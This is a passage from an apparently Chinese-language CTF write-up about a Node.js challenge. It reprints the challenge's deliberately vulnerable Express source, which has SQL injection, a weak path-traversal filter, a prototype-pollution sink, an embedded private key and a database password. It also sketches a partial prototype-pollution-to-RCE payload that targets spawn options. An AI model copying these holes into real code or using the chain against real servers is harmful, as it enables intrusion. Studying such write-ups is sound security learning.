&#125;</span><br><span class="line">  <span class="title class_">Reportcache</span>[user][date] = reportmessage</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Report Success&#x27;);window.location.href=&#x27;/report&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/VanZY_s_T3st&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> command = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> cmd = cp.<span class="title function_">spawn</span>(command ,[]);</span><br><span class="line">  cmd.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">end</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h2 id="如何解决"><a href="#如何解决" class="headerlink" title="如何解决"></a>如何解决</h2><blockquote><p>pp2rce原理部分见同名文章，但是看完还是没看懂题解啊55，欸欸欸，有点思路了<br><a href="https://xz.aliyun.com/t/15782?time__1311=GqjxnQGQDQExl6zG7DyDIOOQGCYyh3+x3x&u_atoken=e4ab7359fc825c21b8d183b69afdd937&u_asig=0a47315217305328929498942e013f#toc-4">这篇文章看思路就好了</a>，和我最后顿悟的分析一致</p></blockquote><ol><li>再次回看，直接按照spawn的输入进行思考(<strong>有个参照好很多</strong>)，注意apply里的arg包括了command，分析可知会进入<code>pos&lt;args.length</code>环节，可知pos会++，变成2</li><li>这里ai一下可以知道，如果传入的是空的比如<code>prototypelessSpawnOpts()</code>再加上后买你<code>Object.create()</code>和<code>Object.assign()</code>原型链污染被过滤的死死的，要污染到env传入的obj中env有内容，也就是需要从<code>if(hasArgs...)</code>这个if条件中进入，此时的传入为<code>args[2]</code></li><li>综上，需要args[2]是一个对象，结合原型链污染漏洞，构造1如下，后续就考虑经典的pp2rce问题即可</li></ol>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造1</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;__proto__&quot;</span></span><br><span class="line">  <span class="string">&quot;date&quot;</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="comment">// 以下对象值会是传入spawn()中options的内容</span></span><br><span class="line">  <span class="string">&quot;reportmessage&quot;</span>:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;NODE_OPTIONS&quot;</span>: <span class="comment">// ...</span></span><br><span class="line">    <span class="string">&quot;env&quot;</span>:  <span class="comment">//... </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最终payload2</span></span><br></pre></td></tr></table></figure><h2 id="新东西"><a href="#新东西" class="headerlink" title="新东西"></a>新东西</h2><ol><li>node proxy 见 Nodejs安全</li><li>pp2rce见同名文章</li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> nodeRsa = <span class="built_in">require</span>(<span class="string">&#x27;node-rsa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> handle = <span class="built_in">require</span>(<span class="string">&#x27;./handle&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> con = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">  <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  <span class="attr">user</span>: <span class="string">&#x27;ctf&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&#x27;ctf123123&#x27;</span>,</span><br><span class="line">  <span class="attr">port</span>: <span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line">  <span class="attr">database</span>: <span class="string">&#x27;sctf&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">con.<span class="title function_">connect</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error connecting to MySQL:&#x27;</span>, err.<span class="property">message</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(con.<span class="title function_">connect</span>(), <span class="number">2000</span>); <span class="comment">// 2秒后重试连接</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connected to MySQL&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;response&#125; = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> req = <span class="built_in">require</span>(<span class="string">&quot;express/lib/request&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span class="keyword">new</span> <span class="title function_">nodeRsa</span>(&#123; <span class="attr">b</span>: <span class="number">1024</span> &#125;);</span><br><span class="line">key.<span class="title function_">setOptions</span>(&#123; <span class="attr">encryptionScheme</span>: <span class="string">&#x27;pkcs1&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> publicPem = -----<span class="variable constant_">BEGIN</span> <span class="variable constant_">PUBLIC</span> <span class="variable constant_">KEY</span>-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B<span class="comment">//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----;</span></span><br><span class="line"><span class="keyword">var</span> privatePem = <span class="string">`-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27</span></span><br><span class="line"><span class="string">PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l</span></span><br><span class="line"><span class="string">i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi</span></span><br><span class="line"><span class="string">6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI</span></span><br><span class="line"><span class="string">lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY</span></span><br><span class="line"><span class="string">Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61</span></span><br><span class="line"><span class="string">khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT</span></span><br><span class="line"><span class="string">6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78</span></span><br><span class="line"><span class="string">dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG</span></span><br><span class="line"><span class="string">mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye</span></span><br><span class="line"><span class="string">KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh</span></span><br><span class="line"><span class="string">UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l</span></span><br><span class="line"><span class="string">zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg</span></span><br><span class="line"><span class="string">xu/vfQ0A1jHRNC7t</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Reportcache</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">verifyAdmin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> token = req.<span class="property">cookies</span>[<span class="string">&#x27;auth_token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;No token provided&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">SECRET_KEY</span>, <span class="function">(<span class="params">err, decoded</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Failed to authenticate token&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (decoded.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Access denied. Admins only.&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req.<span class="property">user</span> = decoded;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/hello&#x27;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>)=&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;&lt;h1&gt;Welcome Admin!!!&lt;/h1&gt;&lt;br&gt;&lt;img src=&quot;./1.jpeg&quot; /&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/config&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123;</span><br><span class="line">    <span class="attr">publicKey</span>: publicPem,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> decrypt = <span class="keyword">function</span>(<span class="params">body</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> pem = privatePem;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="keyword">new</span> <span class="title function_">nodeRsa</span>(pem, &#123;</span><br><span class="line">      <span class="attr">encryptionScheme</span>: <span class="string">&#x27;pkcs1&#x27;</span>,</span><br><span class="line">      <span class="attr">b</span>: <span class="number">1024</span></span><br><span class="line">    &#125;);</span><br><span class="line">    key.<span class="title function_">setOptions</span>(&#123; <span class="attr">environment</span>: <span class="string">&quot;browser&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span> key.<span class="title function_">decrypt</span>(body, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;decrypt error&quot;</span>, e);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> encryptedPassword = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">  <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    passwd = <span class="title function_">decrypt</span>(encryptedPassword)</span><br><span class="line">    <span class="keyword">if</span>(username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> sql = <span class="title function_">select</span> (select password <span class="keyword">from</span> user where username = <span class="string">&#x27;admin&#x27;</span>) = <span class="string">&#x27;$&#123;passwd&#125;&#x27;</span>;</span><br><span class="line">      con.<span class="title function_">query</span>(sql, <span class="function">(<span class="params">err, rows</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(err.<span class="property">message</span>);</span><br><span class="line">        <span class="keyword">if</span> (rows[<span class="number">0</span>][<span class="title class_">Object</span>.<span class="title function_">keys</span>(rows[<span class="number">0</span>])]) &#123;</span><br><span class="line">          <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;username, <span class="attr">role</span>: username&#125;, <span class="variable constant_">SECRET_KEY</span>, &#123;<span class="attr">expiresIn</span>: <span class="string">&#x27;1h&#x27;</span>&#125;);</span><br><span class="line">          res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, token, &#123;<span class="attr">secure</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">          res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Login Successfully&#x27;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;Errow Password!&#x27;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;This Website Only Open for admin&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;Error decrypting password!&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/ExP0rtApi&#x27;</span>, verifyAdmin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> rootpath = req.<span class="property">query</span>.<span class="property">v</span>;</span><br><span class="line">  <span class="keyword">var</span> file = req.<span class="property">query</span>.<span class="property">f</span>;</span><br><span class="line"></span><br><span class="line">  file = file.<span class="title function_">replace</span>(<span class="regexp">/\.\.\//g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  rootpath = rootpath.<span class="title function_">replace</span>(<span class="regexp">/\.\.\//g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(rootpath === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(file === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;try to find parameters HaHa&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      rootpath = <span class="string">&quot;static&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, rootpath + <span class="string">&quot;/&quot;</span> + file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(filePath)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;File not found&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, fileData</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error reading file:&#x27;</span>, err);</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    zlib.<span class="title function_">gzip</span>(fileData, <span class="function">(<span class="params">err, compressedData</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error compressing file:&#x27;</span>, err);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error compressing file&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> base64Data = compressedData.<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">      res.<span class="title function_">send</span>(base64Data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&quot;/static/report_noway_dirsearch.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;user, date, reportmessage&#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Reportcache</span>[user] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="title class_">Reportcache</span>[user] = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Reportcache</span>[user][date] = reportmessage</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Report Success&#x27;);window.location.href=&#x27;/report&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/countreport&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> user <span class="keyword">in</span> <span class="title class_">Reportcache</span>) &#123;</span><br><span class="line">    count += <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Reportcache</span>[user]).<span class="property">length</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; count &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看当前运行用户</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/VanZY_s_T3st&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> command = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> cmd = cp.<span class="title function_">spawn</span>(command ,[]);</span><br><span class="line">  cmd.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">end</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running on http://localhost:3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;body-parser&quot;</span>: <span class="string">&quot;^1.20.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cookie-parser&quot;</span>: <span class="string">&quot;^1.4.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;crypto&quot;</span>: <span class="string">&quot;^1.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;express&quot;</span>: <span class="string">&quot;^4.21.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jsonwebtoken&quot;</span>: <span class="string">&quot;^9.0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mysql&quot;</span>: <span class="string">&quot;^2.18.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;node-rsa&quot;</span>: <span class="string">&quot;^1.1.1&quot;</span>,</span><br><span class="line">  